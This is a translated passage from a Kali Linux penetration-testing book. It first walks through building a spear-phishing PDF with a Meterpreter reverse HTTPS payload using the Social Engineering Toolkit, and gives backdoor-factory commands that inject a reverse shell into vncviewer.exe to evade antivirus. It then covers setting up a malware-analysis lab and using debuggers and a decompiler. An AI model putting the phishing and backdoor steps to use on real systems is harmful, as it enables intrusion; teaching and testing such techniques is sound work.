在下图中，我们可以看到扫描源由侦听器标记，并且所有扫描请求都记录为来自`10.0.2.15`，这是 Kali 机器的内部 IP：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/277a7f2e-2df2-41fa-a9ff-c3bfe4bf48cd.png)

我们将要创建的恶意软件将是一个包含在 PDF 文件中的可执行文件。这将作为附件发送到目标公司中一个被确认的系统管理员的电子邮件，该邮件来自一个据称是安全来源的电子邮件。我们将从社会工程工具包的菜单结构开始进行审查。

主菜单有六个条目和一个退出提示：

1.  1）社会工程攻击

1.  2）快速跟踪渗透测试

1.  3）第三方模块

1.  4）更新社会工程师工具包

1.  5）更新 SET 配置

1.  6）帮助、积分和关于

1.  99）退出社会工程工具包

在条目＃1 下，`社会工程攻击`，有 11 个条目：

1.  1）鱼叉式网络钓鱼攻击向量

1.  2）网站攻击向量

1.  3）传染性媒体生成器

1.  4）创建有效载荷和侦听器

1.  5）大规模邮件发送攻击

1.  6）基于 Arduino 的攻击向量

1.  7）无线接入点攻击向量

1.  8）QR 码生成器攻击向量

1.  9）Powershell 攻击向量

1.  10）第三方模块

1.  99）返回主菜单。

# 使用鱼叉式网络钓鱼攻击向量菜单

`鱼叉式网络钓鱼攻击向量`菜单有四个选项：

1.  1) 执行大规模电子邮件攻击

1.  2) 创建一个文件格式有效负载

1.  3) 创建社会工程模板

1.  99) 返回主菜单

由于我们将建立一个持久的威胁，让我们能够控制受害者的机器，并且必须克服用户可能不愿意双击附件的可能性，我们必须创建一个不可抗拒的鱼叉式网络钓鱼邮件。为了做到这一点，提前进行有效的侦察是很重要的。

公司通讯录和日历对于制造打开邮件所需的紧迫感是有用的。就像通过电子邮件进行营销一样，无论是合法的还是垃圾邮件，鱼叉式网络钓鱼邮件的标题必须对受害者有趣、引人入胜或令人恐惧。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/501e35a9-7355-4c94-8bd9-cd6a2a64c88a.png)

这封电子邮件简短、有趣，并且可以通过贪婪来制造紧迫感。附件可以是以下任何一种：

+   一个 ZIP 文件，假定里面有一个文档

+   一个 Word 文档

+   一个 PDF 文件

SET 提供了 21 种可能的有效负载。其中一些在 Mac 操作系统上的效果会比在 Windows 系统上更好。大多数 Windows 工作站没有配置处理 RAR 压缩文件。以下是可用的选择：

1.  1) SET 自定义编写的 DLL 劫持攻击向量（RAR，ZIP）

1.  2) SET 自定义编写的文档 UNC LM SMB 捕获攻击

1.  3) MS14-017 Microsoft Word RTF 对象混淆（2014-04-01）

1.  4) Microsoft Windows CreateSizedDIBSECTION 堆栈缓冲区溢出

1.  5) Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)

1.  6) Adobe Flash Player“Button”远程代码执行

1.  7) Adobe CoolType SING 表“uniqueName”溢出

1.  8) Adobe Flash Player“newfunction”无效指针使用

1.  9) Adobe Collab.collectEmailInfo 缓冲区溢出

1.  10) Adobe Collab.getIcon 缓冲区溢出

1.  11) Adobe JBIG2Decode 内存损坏利用

1.  12) Adobe PDF 嵌入式 EXE 社会工程

1.  13) Adobe util.printf()缓冲区溢出

1.  14) 自定义 EXE 到 VBA（通过 RAR 发送）（需要 RAR）

1.  15) Adobe U3D CLODProgressiveMeshDeclaration 数组超限

1.  16) Adobe PDF 嵌入式 EXE 社会工程（NOJS）

1.  17) Foxit PDF Reader v4.1.1 标题堆栈缓冲区溢出

1.  18) Apple QuickTime PICT PnSize 缓冲区溢出

1.  19) Nuance PDF Reader v6.0 启动堆栈缓冲区溢出

1.  20) Adobe Reader u3D 内存损坏漏洞

1.  21) MSCOMCTL ActiveX 缓冲区溢出（ms12-027）

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/dd7b9407-5bf6-410d-8623-38eaf4fbd7b7.png)

让我们只选择默认的项目 12。当您按*Enter*时，下一个屏幕让您选择自己选择的经过处理的 PDF 文件，或者使用内置的空白 PDF。选择第二个选项，我们看到七个选项：

1.  1) Windows 反向 TCP Shell

1.  2) Windows Meterpreter Reverse_TCP

1.  3) Windows 反向 VNC DLL

1.  4) Windows 反向 TCP Shell（x64）

1.  5) Windows Meterpreter Reverse_TCP（X64）

1.  6) Windows Shell Bind_TCP (X64)

1.  7) Windows Meterpreter Reverse HTTPS

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/6ce59fb0-5deb-462b-a6a3-4f605a32b927.png)

由于其中三个选项将运行代码，使受害者机器联系到您的 Metasploit Framework Meterpreter 工具，而且您已经在使用该工具进行练习，选择其中一个作为您的恶意有效负载可能是有意义的。让我们选择选项`7) Windows Meterpreter Reverse HTTPS`。

当我们输入`7`时，会得到几个选项：

+   监听器的 IP 地址（LHOST）：使用您将拥有监听器的主机地址。我的 Kali 工作站认为它是 10.0.2.15。

+   连接回[443]端口：端口`443`在这里是默认的，但您可以在监听设备上的任何端口上设置监听器。`443`是 HTTPS 端口，因此由于其编号，它看起来不会不寻常。端口`12234`看起来不寻常，如果防火墙管理员正在将批准的端口列入白名单，并将其他所有端口列入黑名单，则可能也会被阻止。它说明有效负载被发送到`/root/.set/template.pdf`目录。

这不是它的作用。在这种情况下，可执行文件被设置为`legit.exe`。当您输入文件名时，如下面的截图所示，您需要使用完整的路径：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/5be5dade-6d9e-460a-8dfe-d068018856f0.png)

选择 PDF 的名称后，启动社会工程工具包大规模邮件发送程序。

如果您找到了一个开放的邮件中继，邮件发送程序将使用该中继，一个 Gmail 帐户或任何合法的电子邮件 SMTP 服务器。SET 不包含自己的 SMTP 服务器。您可能希望找到一个可以用于此目的的免费电子邮件服务，或者使用一个开放的中继邮件服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a860d416-3adb-4f5a-85b0-3715dd2b0fa6.png)

# 选择一个主题，或者编写一封新的电子邮件消息

SET 允许您为钓鱼电子邮件攻击选择几个不同的有吸引力的电子邮件主题，并且您可以轻松添加新模板以自定义方法。以下列表中的第四个选择是我们刚刚创建的选择：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ea8b6337-4dc8-4013-acec-c973d0042ed6.png)

为了测试系统，我选择将攻击发送到一个我控制的 Gmail 帐户。如果发送消息时出现错误，SET 不会返回到邮件发送程序部分。Google Mail 捕获了虚假的 PDF 文件，并发送了一个指向其安全页面的链接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/8ad7cd15-7d83-4f80-bab7-3c1070ecc993.png)

使用不检查感染附件的服务器的电子邮件帐户。我们使用了`evilhacker@act23.com`，并将电子邮件发送到`kalibook@act23.com`，这起作用了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/4c9f74d7-6cfe-431d-8be3-2b32c54f5793.png)

# 使用后门工厂来规避杀毒软件

这个利用代码在没有杀毒软件的 XP SP2 机器上运行良好，并且在任何没有安装 AV 的机器上都会运行良好，但在安装了基本默认 Windows 杀毒软件的 Windows 10 机器上效果较差。我们不得不关闭杀毒软件的实时检查功能，才能使电子邮件在没有错误的情况下读取，而杀毒软件则清除了我们的篡改文件。作为安全工程师，我们很高兴微软 Windows 10 拥有如此有效的反恶意软件功能。作为渗透测试人员，我们感到失望。

后门工厂将 shellcode 插入工作中的 EXE 文件，而不会对原始文件进行太多更改。您可以使用`/usr/share/windows-binaries`目录中的可执行文件，如下面的截图所示，或者任何其他没有内置保护的 Windows 二进制文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/28f499f6-38d8-4c5d-a6b7-98ee4b56d76b.png)

运行 Backdoor Factory 并在`10.0.0.2`上的端口`43434`创建一个远程 shell 的代码如下。跳洞选项将您的代码传播到可执行文件中的空白，以进一步混淆杀毒软件扫描：

```
backdoor-factory -cave-jumping -f /usr/share/windows-binaries/vncviewer.exe -H 10.0.0.2 -P 43434 -s reverse_shell_tcp  
```

如果您在 shellcode 选择中出现错误，应用程序会显示您的选择：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c25fd43e-5741-4d32-bb29-1b3ffa7e30af.png)

```
backdoor-factory -cave-jumping -f /usr/share/windows-binaries/vncviewer.exe -H 10.0.0.2 -P 43434 -s reverse_shell_tcp_inline 
```

然后，后门工厂继续并提供选项，将 shellcode 注入二进制文件中的所有空白或洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a5df754f-1f57-41b9-a382-f03992a1216f.png)

我们将选择 Cave 1：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/6d2fbe20-617e-428e-afeb-d6f2c5db0cf8.png)

`backdoored`目录位于根`home`目录`~/backdoored/`中，因此很容易找到。我们可以使用 SET 将这个篡改过的文件推送到大规模邮件中，但您可以只需从伪造的帐户发送电子邮件到 Windows 10 框，以查看它是否可以清除杀毒软件障碍。可执行文件必须被压缩以通过我们的邮件服务器上的过滤器，一旦它在 Windows 10 机器上解压缩，它就会被删除为恶意软件文件。

Windows 10 的默认杀毒软件发现了这个文件，就像它发现了 SET 中的其他文件一样。未打补丁的旧版本的 Windows 明显存在风险。

# 总结

在本章中，您已经看到了五种不同的方法来控制并在 Windows 机器上设置后门，从 Ncat 脚本编写，到 Metasploit Meterpreter 攻击，再到添加一个 Drop Box，再到使用 SET 发送钓鱼邮件，以及使用 Backdoor Factory 创建带有 shell 脚本后门的可执行文件。

在本章中，我们还学习了在各种设备上设置和使用跳板机。

在下一章中，我们将讨论反向工程恶意软件的收集，以便您了解它在野外或您的网络中可能会做什么，并对您的设备进行压力测试。

# 进一步阅读

+   **Kali 树莓派设置**：[`docs.kali.org/kali-on-arm/install-kali-linux-arm-raspberry-pi`](https://docs.kali.org/kali-on-arm/install-kali-linux-arm-raspberry-pi)

+   **树莓派磁盘加密**：[`docs.kali.org/kali-dojo/04-raspberry-pi-with-luks-disk-encryption`](https://docs.kali.org/kali-dojo/04-raspberry-pi-with-luks-disk-encryption)


# 第十章：逆向工程和压力测试

如果您想知道恶意软件的行为，最简单的方法是让它在您的网络中肆虐，并跟踪其在野外的行为。这不是您想要了解恶意软件行为的方式。您可能会轻易错过您的网络环境没有执行的某些内容，然后您将不得不从网络中的所有计算机中删除恶意软件。Kali 有一些精选的工具可以帮助您做到这一点。本章还涵盖了压力测试您的 Windows 服务器或应用程序。如果您想发现 DDoS 会让您的服务器崩溃多少，这是一个很好的主意。本章是如何开发一个抗脆弱、自我修复的 Windows 网络的开端。

在本章中，我们将学习以下主题：

+   建立测试环境

+   逆向工程理论

+   使用布尔逻辑

+   逆向工程实践

+   压力测试您的 Windows 机器

与 Kali Linux 1.x 相比，Kali Linux 2.0 中提供的逆向工程工具有一些变化。一些工具已经从菜单结构中消失，如果您希望，可以使用第六章的最后一节，*NetBIOS 名称服务和 LLMNR - 已过时但仍然致命*，将它们放回。一些工具根本没有包含在 Kali Linux 2 中，尽管在各处都有它们的痕迹。以下表格显示了这些变化。

显示完整路径的工具在默认的 Kali 2.0 菜单中根本不存在，NASM Shell，Metasploit Framework 套件的一部分，在 Kali 1.x 菜单中也不存在。

以下表格显示了 Kali 1.x 和 2.0 中工具的区别：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ffda7889-19ed-40d0-8120-33d91c492340.png)

# 技术要求

对于本章，您将需要以下内容：

+   运行中的 Kali Linux 机器

+   运行中的 Windows 操作系统副本（可以是虚拟机）

# 建立测试环境

开发您的测试环境需要对您正在测试的所有 Windows 操作系统进行虚拟机示例。例如，应用程序开发人员可能正在运行非常旧的浏览器/操作系统测试机器，以查看对于运行古董硬件的客户来说会出现什么问题。在这个例子中，我们正在运行 Windows XP、Windows 7 和 Windows 10。我们正在使用 Oracle VirtualBox 进行桌面虚拟化，但如果您更喜欢使用 VMWare，那就使用它。重要的是要使用您可以与主网络隔离的机器，以防恶意软件表现如其应该，并试图感染周围的机器。

# 创建您的受害机器

如果您已经为其他目的设置了 Windows 虚拟机，您可以克隆它们（可能是最安全的选项）或者从快照中运行它们（这是设置的最快方式）。在构建完它们后，这些机器不应该能够访问主网络，并且您可能应该将它们设置为仅与内部网络通信。

# 测试您的测试环境

1.  启动您的 Kali 虚拟机

1.  确保您的 Kali 实例可以与互联网通信，以便轻松获取更新

1.  确保您的 Kali 实例可以与您的主机机器通信

1.  启动您的目标 Windows 实例

1.  确保您的 Windows 受害者无法访问互联网，或者您的私人以太网局域网，以避免恶意软件的意外传播

我们测试网络上的三台虚拟机都在 Oracle VirtualBox 内部的仅主机网络上。DHCP 由主机提供（`192.168.56.100`），三台测试网络机器分别是`101`、`102`和`103`，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/bf29f285-779a-40a1-b74a-0e24abb9d844.png)

# 逆向工程理论

理论因某种原因使 IT 专业人员感到恐慌。这并不真正有根据，因为理论是您所有故障排除的基础。这可能是您通过 X 年的艰难试错学到的公理。在定性研究领域，这实际上被称为**基础理论研究方法**。逆向工程的基本理论是输出推断应用程序的内部行为。当您面对一种恶意软件时，您将开始从以下混合物中提出工作假设：

+   从与被视为相似的恶意软件的交互中回忆的先验知识

+   与测试中的恶意软件的交互的感知结果的概括

**黑客提示**：

在*a priori*的情况下给应用程序贴标签可能没有用。这可能掩盖了应用“如果它走起来像鸭子，叫起来像鸭子，那它可能就是鸭子”的公理。特别是对于恶意软件，设计可能包括一些欺骗性特征，预期会让你走上错误的道路。考虑一下作为其第一个任务删除其他特洛伊木马和 rootkit 的特洛伊木马和 rootkit。它们正在清理你的环境，但是，它们真的是你的朋友吗？

恶意软件应用程序旨在从输入中提供输出，但是知道输出和输入并不能真正让你了解输出是如何实现的。输出可以通过几种不同的方式产生，您可能会发现开发人员选择创建应用程序的方式很重要。

# 逆向工程的一个一般理论

这个理论是由李和约翰逊-莱尔德在 2013 年发表在《认知心理学杂志》上的，对信息安全从业者有用，因为它在布尔系统中显示。布尔系统是逻辑门。条件要么为真，要么为假。问题的一个非常常见的定义可能如下：

“任何要进行逆向工程的系统都包含一定数量的组件，这些组件共同作用产生了系统的行为。其中一些组件是可变的，也就是说，它们可以处于影响系统性能的多个不同状态，例如，数码相机上允许播放或删除照片的设置。系统的其他组件不变，例如，从开关到灯泡的导线。系统具有用户的一些不同输入和一些随之而来的输出，并且它们由有限数量的相互连接的组件中介。在某些系统中，一个组件可能具有潜在的无限数量的特定状态，例如，不同的电压。但是，为了进行逆向工程，我们假设所有可变组件都可以被视为具有有限数量的不同状态，也就是说，整个系统等同于有限状态自动机。换句话说，模拟系统可以被数字化，例如数码相机、CD 和其他以前的模拟设备。我们还假设设备旨在是确定性的，尽管非确定性有限状态设备总是可以被确定性设备模拟。”

–（李和约翰逊-莱尔德，2013）

逆向工程理论及其在布尔系统中的应用。*认知心理学杂志，25(4)*，365-389。[`doi.org/10.1080/20445911.2013.782033`](http://doi.org/10.1080/20445911.2013.782033)。

李和约翰逊-莱尔德模型仅使用布尔内部模型来表示可能的内部条件，以揭示已注意到的行为。由于不可能测试无限数量的输入，因此测试仅可能的输入和输出的子集更有用。我们可以从一个简单的例子开始，例如这里：

+   如果恶意软件降落在苹果平台上，并且旨在利用 Windows 漏洞，那么它很可能根本无法运行（开关 1）。

+   如果它落在 Windows 机器上，但是针对 XP 版本的漏洞，它可能会测试该操作系统版本，并且如果发现自己在 Windows Server 2012 上则不执行任何操作（开关 2）

+   如果碰巧是 Windows XP，但已修补所寻找的漏洞，它也可能不执行任何操作（开关 3）

+   如果它落在一个包含所寻找的未修补漏洞的 Windows XP 机器上，它会释放其有效负载

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/13e08369-520c-4bb4-b21b-d474c3bc2225.png)

# 使用布尔逻辑

计算机程序由使用条件和决策的**数据结构**组成，以获得所需的输出。我们将在这里使用 Python 符号，因为它很简单，而且您可能以前见过它。基本的数据结构如下。

+   迭代器，如 while 循环和 for 循环。迭代器循环的次数与其被告知的次数一样多，每次循环时运行其他命令。

+   决策点，如 if 结构和 case 结构。前面的图是一组嵌套的 if 结构。

| **布尔运算符** |
| --- |
| **符号** | **描述** | **示例** |
| --- | --- | --- |
| X == Y | X 等于 Y。这不总是一个数字值集。 | "shirts" == "hats" 评估为 FALSE。"shirts" == "shirts" 评估为 TRUE。1 == 11 评估为 FALSE。11 == 11 评估为 TRUE。 |
| X != Y | X 不等于 Y。 | "shirts" != "hats" 评估为 TRUE。"shirts" != "shirts" 评估为 FALSE。1 != 11 评估为 TRUE。11 != 11 评估为 FALSE。 |
| X <= Y | X 小于或等于 Y。 | "shirts" <= "hats" 评估为 FALSE。"shirts" <= "shirts" 评估为 TRUE。（它在计算字符。）1 <= 11 评估为 TRUE。11 <= 11 评估为 TRUE。 |
| X >= Y | X 大于或等于 Y。 | "shirts" >= "hats" 评估为 TRUE。"shirts" >= "shirts" 评估为 TRUE。（它在计算字符。）1 <= 11 评估为 TRUE。11 <= 11 评估为 TRUE。 |
| X < Y | X 小于 Y。 | "shirts" < "hats" 评估为 FALSE。"shirts" < "shirts" 评估为 FALSE。（它在计算字符。）1 < 11 评估为 TRUE。11 < 11 评估为 FALSE。 |
| X > Y | X 大于 Y。 | "shirts" > "hats" 评估为 TRUE。"shirts" > "shirts" 评估为 FALSE。（它在计算字符。）1 > 11 评估为 FALSE。11 > 11 评估为 FALSE。 |

下表显示了用于逻辑操作的布尔变量，以连接元素以获得更复杂条件。您可能希望有以下限制条件：

+   X 和 Y 都为真

+   X 和 Y 都为假

+   X 或 Y 为真

+   除了 X 之外的任何东西

+   除了 Y 之外的任何东西

| **布尔变量** |
| --- |
| **变量** | **描述** | **示例** |
| --- | --- | --- |
| AND | 产生一个布尔比较，只有当所有元素都为真时才为真。 | `if ((1 == 1) and (2 == 2))` 评估为 TRUE，因为所有元素都为真。`if ((1 == 1) and (2 > 2))` 评估为 FALSE，因为只有一个元素为真。`if ((1 < 1) and (2 > 2))` 评估为 FALSE，因为没有一个元素为真。 |
| OR | 产生一个布尔比较，如果任何一个元素为真则为真。 | `if ((1 == 1) or (2 == 2))` 评估为 TRUE，因为所有元素都为真。`if ((1 == 1) or (2 > 2))` 评估为 FALSE，因为只有一个元素为真。`if ((1 < 1) or (2 > 2))` 评估为 FALSE，因为没有一个元素为真。 |
| NOT | 产生一个布尔比较，只有当所有元素都不为真时才为真。 | `X = 2``if not (X == 3)` 评估为 TRUE，因为 X 不是 3。`X = 3``if not (X == 3)` 评估为 FALSE，因为 X 是 3。 |

以下代码正在测试`X`的两个条件与 NOT 的布尔变量。您可能已经开始看到输出可以从许多不同的内部编码选择中绘制出来。攻击者或原始人可能会通过多种条件来测试条件，因此您必须考虑获得输出的所有方式：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/e5ea8c3b-dc4f-4c92-90fe-7d2ae0238c3b.png)

# 审查 while 循环结构

`while`循环是由真/假选择点明确启动和停止的。这些看起来可能非常复杂，但它们最终会解决为一组有限的测试，针对一个条件：

```
X = 0 
Y = 20 
while (X != Y): print (X), X = X + 1 
```

这个 Python 3 循环将重复打印`X`的值，直到它达到 10，然后停止。如果我们说`while X < Y`，它将完全相同工作，因为循环结构正在测试`X`的增量。使用一个随机数作为增量器元素的更复杂的循环，可能会在随机命中等于`Y`的`X`值之前进行更长时间的运行（或者不运行）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/38da95fe-217a-4e8b-befd-5c08d737b285.png)

很明显，程序每次都在测试循环条件。这是使用随机`X`值的一个例子。首先，选择`X`值，然后运行两次`print(X)`命令。由于`X`只在第一行设置了一次，所以在两次打印命令中它没有改变。当`X`的值被重置时，它打印了一个不同的值。条件是`X`不等于`Y`。我们在几行上设置了`Y`的值，所以不需要重新设置它来运行这个例子。`X`只返回一次的原因是第二次，`X`被随机设置为`11`。从随机抽取中设置为`11`的几率是 11 分之 1，远远超过你赢得 Powerball 彩票的概率：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ce8da739-431f-4bc7-a4b7-5e593a227eed.png)

如果我们再次运行循环，它可能会运行更多次，因为它随机避开了等于`Y`的`X`值。同样，它不会打印`X = 11`的值，因为这是被`while`循环条件排除的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/9f6d296a-3de0-446d-964f-4ff56f7a5caa.png)

# 审查 for 循环结构

`for`循环不需要增量器，因为它将范围构建到条件中，与`while`循环相反，后者只包括一个超出该循环不会运行的限制。使用 Python 符号，以下代码显示了如果您从`0`值的`X`和从一到十一的范围开始会发生什么。`X`的预设值对`for`循环迭代并不重要。它将所有测试的值应用于`X`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/1b3c08e1-a9a5-4561-a493-08ed2e3e8596.png)

我们从`X`设置为`100`开始，但`for`循环从它自己的条件中获取`X`的值：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/33b6b841-da20-4bf7-b6c7-a569fcb293b7.png)

如果你真的希望`X`保持不变，你可以将它用作不同范围的基础，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/2cdd090c-6062-468f-9498-a0ebf506060a.png)

# 理解决策点

`if`结构是一个二进制决定：要么是，要么不是。墙上的开关灯是一个 if 结构的物理例子。如果开关处于一种位置，灯是亮的，如果它处于另一种位置，灯是灭的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/b04ab4ba-4a4a-4740-9377-35a245614bb0.png)

`case`结构是一个具有多个正确答案的决策结构，不只有一个 YES，而没有一个 NO。一个例子可能是一个有三种口味的冰淇淋分配器——巧克力、草莓和香草。如果你不想要冰淇淋，你甚至不会接近这台机器。你有三种选择，它们都是正确的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/6b7e5a48-6bd6-4430-8d71-5b5c83905c12.png)

# 练习逆向工程

由于知道输入和输出不能确保为您提供要逆向工程的应用程序的内部构造的真实图像，让我们看一些来自 Kali Linux 的有用工具，这些工具可能会使事情变得更容易。我们将看看三个调试器，一个反汇编工具和一个杂项逆向工程工具。

我们将展示两个基于 Linux 的调试器**Valgrind**和**EDB-Debugger**的用法和输出，然后展示一个仅适用于 Windows 的调试器**OllyDbg**的类似输出。

反汇编器是**JAD**，它是一个 Java 反编译器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/0b954cd7-29ad-45a7-8a63-2e6848e62f1e.png)

# 使用调试器

调试是什么？通常错误地将这个术语的创造归功于格雷斯·霍珀上将军，她的团队成员在哈佛大学的马克 II 计算机内发现了一只（但已死）蛾卡在继电器内。这个术语实际上可能来自托马斯·爱迪生，因为他提到并定义了术语为*小错误和困难*。在软件开发中，错误通常是逻辑错误，而不是代码中的拼写错误。拼写错误通常会导致代码根本无法编译，因此它们不会离开开发人员的实验室。逻辑错误不会阻止程序编译，但可能会导致输出失败或在启动程序时出现意外行为。与**bug**同义的另一个词是**defect**。项目中的**技术债务**是项目中未修复的缺陷数量。不同的项目经理对未修复的错误有不同的容忍度。许多恶意软件包在发布版本中有几个严重的错误，但一些更复杂的最近的恶意软件包似乎在技术债务方面非常低。

调试器允许您以逐步方式观察应用程序的行为。您可以看到什么被放入内存，进行了什么系统调用，以及应用程序如何获取和释放内存。我们使用调试器的主要原因是检查我们可以访问源代码的程序的行为。这是因为我们最有可能调试的程序是在我们自己的研讨会中制作的代码。这并不完全构成代码安全审计，但可以帮助找出程序泄漏内存的位置，以及它如何清理已使用的内存。许多程序在命令行上显示状态报告，如果您以这种方式启动它们，这些都是内部调试信息。这些信息可能在应用程序发布后进行清理，但在大多数情况下，最终用户从未看到其中任何内容。

# 使用 Valgrind 调试器

程序通常从总内存中保留内存。我们发现在命令行上进行调试的一个有用程序是`valgrind`，它不在默认的 Kali 安装中。当我们发现需要进行初步调试时，我们会添加它。例如，有一次，[`www.openoffice.org/`](http://www.openoffice.org/)的一个版本，在 Linux 上有一个错误，允许安装，但无法运行程序。它在显示初始启动画面时就卡住了。运行以下命令显示它正在寻找一个不存在的文件。我们没有只是发送一个错误报告，并希望解决方案作为补丁添加到源代码中，而是只是添加了缺失的文件作为空白文本文件。这使得 OpenOffice 能够启动。OpenOffice 开发人员后来添加了一个补丁，去除了错误，但我们不必等待。作为`valgrind`的一个例子，以下是在`gedit`上运行测试的命令行代码：

```
valgrind -v --log-file="gedit-test.txt" gedit  
```

在将程序包装在调试器中启动时需要更长的时间，并且整个输出将进入指定的日志文件。一旦程序打开，您可以通过在命令行上按下*Ctrl* + *C*来关闭程序，或者如果被测试的应用程序具有 GUI 界面，您可以关闭窗口，`valgrind`将在观察您正在测试的应用程序关闭后关闭。

在这个例子中，调试器输出了 600 多行，您需要使用一个更用户友好的调试器来找到更有用的信息。请记住，gedit 是一个非常成熟的程序，每次我们使用它来编辑文本文件时都能完美运行，但在打开 gedit，输入几个字符并在不保存新文档的情况下关闭时，`valgrind`在这种简单的用例中记录了 24 个内存错误：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/e8051f1c-ef02-4c49-abf4-92f140f6ab51.png)

# 使用 EDB-调试器

EDB-Debugger 是一个名为 Olly debugger 的 Windows 应用程序的版本。EDB-Debugger 具有以下功能：

+   开发人员称之为直观的 GUI 界面

+   标准调试操作（步入/步过/运行/中断）

+   更多不寻常的条件断点

+   作为插件实现的调试核心（您可以插入替换核心插件）

+   一些平台可能有多个可用的调试 API，如果是这种情况，您可能有一个实现其中任何一个的插件

+   基本指令分析

+   查看/转储内存区域

+   有效地址检查

+   数据转储视图是分页的，允许您同时打开多个内存视图，并可以快速在它们之间切换

+   它允许导入和生成符号映射

+   具有扩展可用性的插件

EDB-Debugger 旨在调试 Linux 应用程序，我们将使用 EDB-Debugger 查看相同的应用程序 gedit。GUI 界面显示如下：

+   标题栏中正在测试的应用程序和进程 ID

+   内存位置

+   命令

+   通用二进制命令映射

+   书签：代码中感兴趣的地方

+   为数据保留的寄存器（特别是在 2/3 中标记的行）

+   数据转储：内存位置和内容

+   内存堆栈数据

以下是 GUI 的截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/684a2a3c-6157-4e31-ae84-f7798c699f06.png)

# EDB-Debugger 符号映射器

EDB-Debugger 可以通过以下命令行输入给您一个符号映射：

```
edb --symbols /usr/bin/gedit > gedit.map 
```

符号表映射程序中的函数、行或变量。对于 gedit，符号表如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c681ada7-4a79-4293-a374-32e87c12de7b.png)

# 运行 OllyDbg

如果您正在运行 Kali Linux 2.0 的 64 位版本，您首先需要更新 Kali。它缺少 32 位 wine 基础设施，而没有这个基础设施，wine 甚至不想启动。幸运的是，Kali Linux 给了您一个有用的错误消息。您只需复制错误消息中的引号部分并运行它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/dce4dcba-bf1e-494a-ae00-d1dea21d9a93.png)

OllyDbg 的 GUI 窗口看起来很像 EDB-Debugger，尽管在图形上有点丑陋。我们正在查看`notepad.exe`，这是一个仅适用于 Windows 的编辑器，类似于 gedit 的简化版本。窗口分为以下部分：

+   标题栏中正在测试的应用程序

+   内存位置

+   符号映射

+   命令

+   寄存器

+   数据转储：内存位置和内容

+   内存堆栈数据

当您打开一个可执行文件（EXE、PIF 或 COM）时，它会显示整个运行程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/8f1acd3b-5b8e-456f-bdee-b5ee6df4fa63.png)

您可以选择在目标 Windows 机器上运行 OllyDbg，通过将其文件夹复制到闪存驱动器并将闪存驱动器携带到受感染的机器上来查看正在进行的感染。您还可以按照第一章中提到的内容，将 Kali Linux 安装到可引导的闪存驱动器上，并直接在受感染的机器上运行 Kali。

# 反汇编器简介

反汇编器将编译的二进制代码显示为汇编代码。这与调试器可以显示的内容类似。

# 运行 JAD

JAD 是 Kali Linux 附带的 Java 反编译器，似乎是分析潜在危险的来自网页的 Java 小程序的有用工具。它最大的问题是自 2011 年以来就没有维护者了，因此很难找到，除非在 Kali 存储库和 Tomas Varaneckas 的博客页面*Jad Decompiler Download Mirror* ([`varaneckas.com/jad/`](http://varaneckas.com/jad/))中。

以下是 JAD 帮助文件中的一页，您可以从主菜单访问，或者通过在命令行中输入`jad`来访问：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/567fb42e-0b7f-4c8b-809c-e5590f6e153d.png)

为了简单地演示使用`jad`，我们为您创建了一个 Java 类。以下三个插图是以下内容的插图

1.  原始源代码（不一定总是可用）

1.  运行`jad`

1.  反编译源代码

所以，这里是一个小的 Java 类的源代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/dfc15700-4027-497a-9286-25dc0c2f0949.png)

应用程序正在运行。我们展示了使用内联帮助的结果（在字母选择中键入问号），只是为了展示可用的详细级别。然后我们选择了`a`，`jad`覆盖了源代码。当您只有编译后的类时，这不会是一个问题：

